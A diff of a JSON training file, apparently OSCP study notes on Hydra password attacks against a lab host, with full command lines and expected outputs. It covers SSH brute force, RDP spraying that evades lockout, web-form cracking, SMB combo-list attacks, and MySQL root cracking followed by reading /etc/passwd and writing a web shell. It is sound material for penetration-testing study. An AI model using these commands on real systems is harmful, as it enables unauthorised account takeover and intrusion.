@@ -32,8 +32,8 @@
             "hydra-wait-time",
             "hydra-output-file"
           ],
-          "expected_outcome": "Hydra tests rockyou.txt against 'developer' account. If password exists in wordlist, Hydra displays: '[22][ssh] host: 192.168.45.100   login: developer   password: summer2023'. SSH login confirmed with: ssh developer@192.168.45.100. Time estimate: 14M passwords ÷ 4 parallel tasks ÷ 2 attempts/second = ~24 hours (run overnight). Early hit possible (rockyou sorted by frequency).",
-          "why_this_works": "SSH typically uses PAM authentication (Linux). No built-in account lockout by default. Fail2ban may be absent or misconfigured. Hydra parallelizes connections (4 simultaneous SSH handshakes). Each connection: TCP handshake → SSH banner → Username → Password attempt → Success/Fail. Successful crack returns 0 exit code, failed password shows 'Authentication failed'. Dictionary attack succeeds when: 1) User chose common password (top 1000 rockyou = 30% hit rate), 2) No rate limiting enforced, 3) Service doesn't log/alert on failed attempts."
+          "expected_outcome": "Hydra tests rockyou.txt against 'developer' account. If password exists in wordlist, Hydra displays: '[22][ssh] host: 192.168.45.100   login: developer   password: summer2023'. SSH login confirmed with: ssh developer@192.168.45.100. Time estimate: 14M passwords \u00f7 4 parallel tasks \u00f7 2 attempts/second = ~24 hours (run overnight). Early hit possible (rockyou sorted by frequency).",
+          "why_this_works": "SSH typically uses PAM authentication (Linux). No built-in account lockout by default. Fail2ban may be absent or misconfigured. Hydra parallelizes connections (4 simultaneous SSH handshakes). Each connection: TCP handshake \u2192 SSH banner \u2192 Username \u2192 Password attempt \u2192 Success/Fail. Successful crack returns 0 exit code, failed password shows 'Authentication failed'. Dictionary attack succeeds when: 1) User chose common password (top 1000 rockyou = 30% hit rate), 2) No rate limiting enforced, 3) Service doesn't log/alert on failed attempts."
         },
         {
           "title": "Scenario 2: RDP Password Spraying Attack",
@@ -46,20 +46,20 @@
             "hydra-show-attempts",
             "hydra-output-file"
           ],
-          "expected_outcome": "Hydra tests Password1! against all 50 users, then Password2!, etc. Lockout avoided (only 1 attempt per user per password). Expected hits: 2-5 accounts (10% hit rate realistic for pattern-matched wordlist). Output: '[3389][rdp] host: 192.168.45.100   login: sarah.jones   password: Sarah2024!'. Time estimate: 10 passwords × 50 users × 5 sec/attempt = 42 minutes. Immediate foothold via RDP. Document all credentials for password reuse testing.",
+          "expected_outcome": "Hydra tests Password1! against all 50 users, then Password2!, etc. Lockout avoided (only 1 attempt per user per password). Expected hits: 2-5 accounts (10% hit rate realistic for pattern-matched wordlist). Output: '[3389][rdp] host: 192.168.45.100   login: sarah.jones   password: Sarah2024!'. Time estimate: 10 passwords \u00d7 50 users \u00d7 5 sec/attempt = 42 minutes. Immediate foothold via RDP. Document all credentials for password reuse testing.",
           "why_this_works": "Password spraying evades lockout by staying under attempt threshold. Corporate users follow patterns (compliance with policy). Season/year appending extremely common (Spring2024!, Summer2024!). RDP authentication via CredSSP/NLA. Single password across many users is stealthier than many passwords on one user (fewer log entries per account). Lockout policy typically: X failed attempts in Y time window. Spraying spreads attempts across time + accounts. Success rate: Targeted wordlist (100 words) > Generic wordlist (14M words) for time-constrained scenarios."
         },
         {
           "title": "Scenario 3: HTTP POST Login Form Attack",
           "context": "You've discovered a web application at http://192.168.45.100/admin/ with custom login form. Burp Suite reveals POST request to /admin/login.php with parameters: username, password, submit=Login. You've found 'admin' is a valid username (different error for valid vs invalid user). No CAPTCHA detected. Session cookies not required for login attempt. Target: Crack admin password.",
-          "approach": "1. Capture POST request with Burp (right-click → Copy to file). 2. Identify failure string in response (e.g., 'Invalid password' or 'Login failed'). 3. Construct Hydra HTTP POST form syntax: '/admin/login.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid password'. 4. Use rockyou.txt for password list. 5. Monitor for success (absence of failure string). 6. Use -V for verbose output to see each attempt. 7. Set -f to stop on first valid password found.",
+          "approach": "1. Capture POST request with Burp (right-click \u2192 Copy to file). 2. Identify failure string in response (e.g., 'Invalid password' or 'Login failed'). 3. Construct Hydra HTTP POST form syntax: '/admin/login.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid password'. 4. Use rockyou.txt for password list. 5. Monitor for success (absence of failure string). 6. Use -V for verbose output to see each attempt. 7. Set -f to stop on first valid password found.",
           "commands": [
             "hydra-http-post-form",
             "hydra-verbose",
             "hydra-show-attempts",
             "hydra-output-file"
           ],
-          "expected_outcome": "Hydra sends POST requests to /admin/login.php with username=admin and passwords from rockyou.txt. Monitors responses for failure string absence. Success: '[80][http-post-form] host: 192.168.45.100   login: admin   password: admin123'. Verify by logging in via browser with admin:admin123. Access admin panel, look for: File upload, command execution, database access, config files. Time: 14M passwords ÷ 16 tasks ÷ 10 req/sec = ~24 hours (optimize with smaller wordlist first).",
+          "expected_outcome": "Hydra sends POST requests to /admin/login.php with username=admin and passwords from rockyou.txt. Monitors responses for failure string absence. Success: '[80][http-post-form] host: 192.168.45.100   login: admin   password: admin123'. Verify by logging in via browser with admin:admin123. Access admin panel, look for: File upload, command execution, database access, config files. Time: 14M passwords \u00f7 16 tasks \u00f7 10 req/sec = ~24 hours (optimize with smaller wordlist first).",
           "why_this_works": "HTTP POST forms are stateless (no session required for authentication). Hydra automates POST request construction. ^USER^ and ^PASS^ are placeholders Hydra replaces with candidates. Failure string detection: Hydra parses HTML response, looks for specified string. Success = string NOT found (indicates different response). Works because: Web apps often have weak passwords (no complexity enforcement), No rate limiting on login endpoint, CAPTCHA absent, Account lockout not implemented. Alternative: If login uses cookies/CSRF, use Burp Intruder instead."
         },
         {
@@ -73,7 +73,7 @@
             "hydra-output-file",
             "hydra-verbose"
           ],
-          "expected_outcome": "Hydra tests each username:password pair from combo.txt against SMB service. Success: '[445][smb] host: 192.168.45.100   login: sarah.jones   password: Summer2024!'. Immediate verification: smbclient -L \\\\192.168.45.100 -U sarah.jones (enter password, list shares). Time: 20 pairs × 3 sec/attempt = 60 seconds. Password reuse common in corporate environments. Use valid credentials for: Share enumeration, lateral movement, credential dumping, privilege escalation.",
+          "expected_outcome": "Hydra tests each username:password pair from combo.txt against SMB service. Success: '[445][smb] host: 192.168.45.100   login: sarah.jones   password: Summer2024!'. Immediate verification: smbclient -L \\\\192.168.45.100 -U sarah.jones (enter password, list shares). Time: 20 pairs \u00d7 3 sec/attempt = 60 seconds. Password reuse common in corporate environments. Use valid credentials for: Share enumeration, lateral movement, credential dumping, privilege escalation.",
           "why_this_works": "Password reuse is endemic. Users use same passwords across: Personal accounts, Corporate accounts, Different services in same network. Combo lists from breaches (LinkedIn, Adobe, etc.) provide real username:password pairs. SMB authentication via NTLM/Kerberos. Domain-joined machines accept domain credentials. Hydra's combo mode optimizes for known pairs (faster than cartesian product). Success indicates: 1) User reused breached password, 2) Corporate password policy allows weak passwords, 3) No credential rotation enforced. Defense: Password manager, MFA, regular password changes."
         },
         {
@@ -87,8 +87,8 @@
             "hydra-wait-time",
             "hydra-output-file"
           ],
-          "expected_outcome": "Hydra tests passwords against MySQL root account. Success: '[3306][mysql] host: 192.168.45.100   login: root   password: root'. Verification: mysql -h 192.168.45.100 -u root -p (enter 'root', gain shell). Enumerate databases: SHOW DATABASES; Look for: wordpress (wp_users table), application DBs (credentials), mysql.user (password hashes). Time: 1000 passwords ÷ 4 tasks ÷ 2 attempts/sec = ~2 minutes. Extract hashes for offline cracking or pivot via stored procedures (UDF exploitation).",
-          "why_this_works": "MySQL default installation often has weak root password (root, mysql, or blank). DBAs prioritize availability over security. Remote root login enabled by default in older versions. Hydra uses MySQL protocol (TCP 3306). Authentication: Client connects → Server sends challenge → Client sends hashed password → Server verifies. Failed attempt = 'Access denied'. Success = Connection established. No account lockout in MySQL (application-level, not DB-level). Success enables: SELECT * FROM mysql.user (dump all DB users), Reading files: SELECT LOAD_FILE('/etc/passwd'), Writing files (if FILE privilege): SELECT 'shell' INTO OUTFILE '/var/www/shell.php'."
+          "expected_outcome": "Hydra tests passwords against MySQL root account. Success: '[3306][mysql] host: 192.168.45.100   login: root   password: root'. Verification: mysql -h 192.168.45.100 -u root -p (enter 'root', gain shell). Enumerate databases: SHOW DATABASES; Look for: wordpress (wp_users table), application DBs (credentials), mysql.user (password hashes). Time: 1000 passwords \u00f7 4 tasks \u00f7 2 attempts/sec = ~2 minutes. Extract hashes for offline cracking or pivot via stored procedures (UDF exploitation).",
+          "why_this_works": "MySQL default installation often has weak root password (root, mysql, or blank). DBAs prioritize availability over security. Remote root login enabled by default in older versions. Hydra uses MySQL protocol (TCP 3306). Authentication: Client connects \u2192 Server sends challenge \u2192 Client sends hashed password \u2192 Server verifies. Failed attempt = 'Access denied'. Success = Connection established. No account lockout in MySQL (application-level, not DB-level). Success enables: SELECT * FROM mysql.user (dump all DB users), Reading files: SELECT LOAD_FILE('/etc/passwd'), Writing files (if FILE privilege): SELECT 'shell' INTO OUTFILE '/var/www/shell.php'."
         }
       ],
       "sections": [
@@ -96,51 +96,126 @@
           "title": "Phase 1: Pre-Attack Reconnaissance",
           "notes": "Before launching password attacks, gather intelligence to optimize success rate and minimize detection. Identify: Valid usernames, Password policy (length, complexity, lockout), Service versions (default credentials), Attack surface (open ports, authentication methods).",
           "commands": [
-            "hydra-show-attempts",
-            "hydra-verbose"
+            {
+              "id": "hydra-show-attempts",
+              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100",
+              "shows": "Shows discovered services/users/shares"
+            },
+            {
+              "id": "hydra-verbose",
+              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -V ssh://192.168.45.100",
+              "shows": "[ATTEMPT] target <TARGET> - login <USER> - pass <PASS>"
+            }
           ]
         },
         {
           "title": "Phase 2: Wordlist Preparation",
           "notes": "Select wordlist based on scenario: Generic attack = rockyou.txt (14M passwords), Targeted attack = Custom wordlist (company patterns, seasons, years), Combo attack = Breached credential pairs. Optimize: Filter by policy (minimum length, complexity), Sort by frequency (most common first), Add mutations (rules for variations).",
           "commands": [
-            "hydra-ssh-single-user",
-            "hydra-rdp-spray",
-            "hydra-combo-attack"
+            {
+              "id": "hydra-ssh-single-user",
+              "example": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.45.100",
+              "shows": "[22][ssh] host: <TARGET>   login: <USERNAME>   password: ..."
+            },
+            {
+              "id": "hydra-rdp-spray",
+              "example": "hydra -L /usr/share/wordlists/dirb/others/names.txt -p \"SuperS3cure1337#\" rdp://192.168.45.100",
+              "shows": "[3389][rdp] host: <TARGET>   login: <USER>   password: <P..."
+            },
+            {
+              "id": "hydra-combo-attack",
+              "example": "hydra -C creds.txt ssh://192.168.45.100",
+              "shows": "valid password found"
+            }
           ]
         },
         {
           "title": "Phase 3: Attack Execution",
           "notes": "Launch Hydra attack with appropriate flags: -l (single user) or -L (user list), -p (single password) or -P (password list), -C (combo mode), -t (parallel tasks: 4 for SSH, 1 for spraying), -w (wait time to evade detection), -V (verbose for monitoring), -o (output file for documentation). Monitor progress and adjust if needed.",
           "commands": [
-            "hydra-ssh-single-user",
-            "hydra-rdp-spray",
-            "hydra-http-post-form",
-            "hydra-smb-attack",
-            "hydra-mysql-attack",
-            "hydra-ftp-attack",
-            "hydra-combo-attack"
+            {
+              "id": "hydra-ssh-single-user",
+              "example": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.45.100",
+              "shows": "[22][ssh] host: <TARGET>   login: <USERNAME>   password: ..."
+            },
+            {
+              "id": "hydra-rdp-spray",
+              "example": "hydra -L /usr/share/wordlists/dirb/others/names.txt -p \"SuperS3cure1337#\" rdp://192.168.45.100",
+              "shows": "[3389][rdp] host: <TARGET>   login: <USER>   password: <P..."
+            },
+            {
+              "id": "hydra-http-post-form",
+              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.45.100 http-post-form \"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid\"",
+              "shows": "[80][http-post-form] host: <TARGET>   login: <USER>   pas..."
+            },
+            {
+              "id": "hydra-smb-attack",
+              "example": "hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.45.100",
+              "shows": "[445][smb] host: <TARGET>   login: <USER>   password: <PASS>"
+            },
+            {
+              "id": "hydra-mysql-attack",
+              "example": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.45.100",
+              "shows": "[3306][mysql] host: <TARGET>   login: <USER>   password: ..."
+            },
+            {
+              "id": "hydra-ftp-attack",
+              "example": "hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.45.100",
+              "shows": "[21][ftp] host: <TARGET>   login: <USER>   password: <PASS>"
+            },
+            {
+              "id": "hydra-combo-attack",
+              "example": "hydra -C creds.txt ssh://192.168.45.100",
+              "shows": "valid password found"
+            }
           ]
         },
         {
           "title": "Phase 4: Session Management",
-          "notes": "For long-running attacks (>1 hour), use session management: --session=<NAME> to enable pause/resume, Ctrl+C to pause gracefully, -R to restore session. Monitor progress: Check output file periodically, Use -V to see real-time attempts, Estimate time remaining: (Total passwords ÷ Parallel tasks) ÷ Attempts per second.",
+          "notes": "For long-running attacks (>1 hour), use session management: --session=<NAME> to enable pause/resume, Ctrl+C to pause gracefully, -R to restore session. Monitor progress: Check output file periodically, Use -V to see real-time attempts, Estimate time remaining: (Total passwords \u00f7 Parallel tasks) \u00f7 Attempts per second.",
           "commands": [
-            "hydra-resume-session",
-            "hydra-show-attempts",
-            "hydra-output-file"
+            {
+              "id": "hydra-resume-session",
+              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -R ssh://192.168.45.100",
+              "shows": "Restoring session from file"
+            },
+            {
+              "id": "hydra-show-attempts",
+              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100",
+              "shows": "Shows discovered services/users/shares"
+            },
+            {
+              "id": "hydra-output-file",
+              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -o hydra_results.txt ssh://192.168.45.100",
+              "shows": "Shows discovered services/users/shares"
+            }
           ]
         },
         {
           "title": "Phase 5: Post-Exploitation Verification",
           "notes": "Immediately verify cracked credentials: SSH: ssh user@target, RDP: xfreerdp /u:user /p:pass /v:target, HTTP: Login via browser, SMB: smbclient -L \\\\target -U user, MySQL: mysql -h target -u user -p. Document: Username, Password, Service, Timestamp, Access level. Test for: Password reuse on other services, Privilege escalation opportunities, Lateral movement paths.",
           "commands": [
-            "hydra-show-attempts",
-            "hydra-output-file"
+            {
+              "id": "hydra-show-attempts",
+              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100",
+              "shows": "Shows discovered services/users/shares"
+            },
+            {
+              "id": "hydra-output-file",
+              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -o hydra_results.txt ssh://192.168.45.100",
+              "shows": "Shows discovered services/users/shares"
+            }
           ]
         }
       ],
-      "tags": ["PASSWORD_ATTACKS", "NETWORK_AUTH", "HYDRA", "OSCP:HIGH", "DICTIONARY_ATTACK", "PASSWORD_SPRAY"]
+      "tags": [
+        "PASSWORD_ATTACKS",
+        "NETWORK_AUTH",
+        "HYDRA",
+        "OSCP:HIGH",
+        "DICTIONARY_ATTACK",
+        "PASSWORD_SPRAY"
+      ]
     }
   ]
 }
